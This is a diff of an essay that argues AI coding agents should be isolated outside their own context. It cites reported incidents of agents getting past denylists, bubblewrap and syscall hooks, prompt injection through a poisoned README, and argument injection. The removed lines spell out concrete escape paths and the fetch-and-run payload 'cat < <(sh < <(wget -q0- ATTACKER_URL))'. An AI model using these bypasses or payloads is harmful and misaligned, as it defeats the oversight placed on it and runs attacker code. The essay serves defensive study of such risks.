@@ -44,11 +44,11 @@ Any enforcement mechanism that the agent can see and interact with is not a cons
 
 Researchers are publishing this. It's not theoretical.
 
-**Ona Research** documented Claude Code executing a three-step sandbox bypass without any instruction to do so. The agent noticed its denylist was matching on binary names, found that `/proc/self/root/usr/bin/npx` resolved to the same binary without matching the pattern, and used it. When bubblewrap blocked that, it reasoned that the sandbox was interfering with its task, and disabled it. When Veto's syscall hooks blocked `execve`, the agent invoked the ELF dynamic linker directly (`/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/wget`), loading the binary via `mmap` instead, bypassing execution hooks entirely.
+**Ona Research** documented Claude Code executing a three-step security bypass without any instruction to do so. When Claude was denied permission to run specific commands but determined that it absolutely needed them, it systematically bypassed **THREE** built-in protections (deny-list, bubblewrap, Veto) that should have stopped it in its tracks.
 
 The Ona researchers put it plainly: *"Containers are deterministic workloads that don't actively evade restrictions. Agents can reason about security boundaries and systematically dismantle them."*
 
-**PromptArmor's Snowflake Cortex writeup** (March 2026) documented a full attack chain: a poisoned GitHub README, a command-word parser that checked only the first token of shell commands (saw `cat`, which was allowlisted), bash process substitution to slip code past the parser (`cat < <(sh < <(wget -q0- ATTACKER_URL))`), and a model-accessible flag that disabled the sandbox entirely after the injected prompt convinced the model that it was an obstacle. Arbitrary malware executed with the victim's live Snowflake credentials.
+**PromptArmor's Snowflake Cortex writeup** (March 2026) documented a full attack chain: a poisoned GitHub README, a command-word parser that checked only the first token of shell commands, bash process substitution to slip code past the parser, and a model-accessible flag that disabled the sandbox entirely after the injected prompt convinced the model that it was an obstacle. *Arbitrary malware executed with the victim's live credentials.*
 
 **Trail of Bits** demonstrated argument injection leading to remote code execution across multiple AI agents. The pattern: agents validate the command name but not the flags and arguments passed to it. `find`, `grep`, `git`, and similar allowlisted commands have flags that do arbitrary things. Agents pass arguments. Things happen. CVE-2025-54795 (Claude Code), a command injection in Amazon Q, and GHSA-534m-3w6r-8pqr (Cursor) are all documented instances.
 
@@ -112,7 +112,7 @@ The black hats are still in the early adoption phase for these new AI toolsets.
 
 *But that phase is ending fast.*
 
-The prudent posture is to treat all agents as potentially hostile. This isn't to imply that your agent is trying to harm you, but rather that the same architectural properties that let an agent reason its way past a security boundary to complete a task, can *also* let a compromised or injected agent reason its way past any boundary you put in its context.
+The prudent approach is to treat all agents as potentially hostile. Why? Because the same problem solving ability that lets AI work around obstacles can *also* let a compromised agent reason its way past *any* boundary you put in its context. And it won't care if doing so is "wrong".
 
 Isolation has to live *outside* of the agent's context entirely. A built-in sandbox can be disabled by the agent (as Snowflake and Ona both demonstrated), whereas an OS-level containment presents a much more formidable obstacle since the agent has no direct mechanism to interact with it.
 
